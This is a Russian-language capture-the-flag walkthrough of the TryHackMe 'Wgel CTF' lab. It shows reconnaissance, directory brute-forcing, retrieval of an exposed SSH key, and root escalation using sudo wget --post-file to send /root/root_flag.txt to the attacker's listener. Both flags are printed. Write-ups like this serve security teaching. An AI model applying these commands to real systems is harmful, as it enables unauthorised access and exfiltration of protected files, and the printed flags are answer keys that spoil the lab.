Wgel CTF

TryHackMe | #web #linux #privesc | Nov 05, 2026

Всем привет. Это полный разбор комнаты Wgel CTF с платформы TryHackMe. Цель — получить пользовательский и корневой флаги. Комната уровня Easy, отлично подходит для тренировки базовых навыков веб-разведки и эскалации привилегий через нестандартное использование разрешенных утилит.

1. Разведка (Reconnaissance)

Первым делом сканируем целевой хост с помощью Nmap. Нам нужно понять, какие сервисы запущены на машине.

nmap -sC -sV -Pn -p 22,80 10.113.135.112

Результат сканирования:

  • 22/tcp (SSH): OpenSSH 7.2p2 Ubuntu
  • 80/tcp (HTTP): Apache httpd 2.4.18

На 80-м порту висит дефолтная страница Apache «It works!». Это ширма.

2. Веб-разведка и Брутфорс

Смотрим исходный код страницы (Ctrl+U) и в самом низу находим комментарий разработчика: <!-- Jessie don't forget to update the website -->. Запоминаем имя пользователя: jessie.

Далее запускаем брутфорс директорий с помощью Gobuster, чтобы найти скрытые папки.

gobuster dir -u http://10.113.135.112 -w /usr/share/wordlists/dirb/common.txt

Находим папку /sitemap/. Запускаем Gobuster уже внутри неё:

gobuster dir -u http://10.113.135.112/sitemap/ -w /usr/share/wordlists/dirb/common.txt

Находим скрытую директорию /.ssh (код ответа 301).

3. Первоначальный доступ (Initial Access)

Заходим в папку /.ssh через браузер или curl. Там лежит приватный ключ id_rsa. Скачиваем его и даем правильные права.

curl http://10.113.135.112/sitemap/.ssh/id_rsa -o id_rsa
chmod 600 id_rsa

Подключаемся по SSH под пользователем jessie:

ssh -i id_rsa jessie@10.113.135.112

Мы внутри системы. Ищем пользовательский флаг в документах:

cat /home/jessie/Documents/user_flag.txt

Флаг пользователя: 057c67131c3d5e42dd5cd3075b198ff6

4. Эскалация привилегий (Privilege Escalation)

Теперь нам нужно стать рутом. Проверяем, что пользователю jessie разрешено запускать от имени root:

sudo -l

Видим строку: (root) NOPASSWD: /usr/bin/wget. Это значит, что мы можем запускать wget с правами рута без пароля. Используем это для эксфильтрации (кражи) корневого флага.

На нашей атакующей машине (AttackBox) поднимаем слушатель:

nc -lvnp 4444

На машине жертвы выполняем команду, которая заставит wget отправить файл из /root/ на наш IP:

sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.113.180.235:4444/

В терминале с netcat мы получаем HTTP POST-запрос, в теле которого находится флаг.

Корневой флаг: b1b968b37519ad1daa6408188649263d

Вывод

Комната отлично демонстрирует опасность оставления скрытых файлов (особенно приватных ключей) на веб-сервере. А также показывает, как безобидная утилита (wget), запущенная с повышенными привилегиями, может привести к полной компрометации системы.
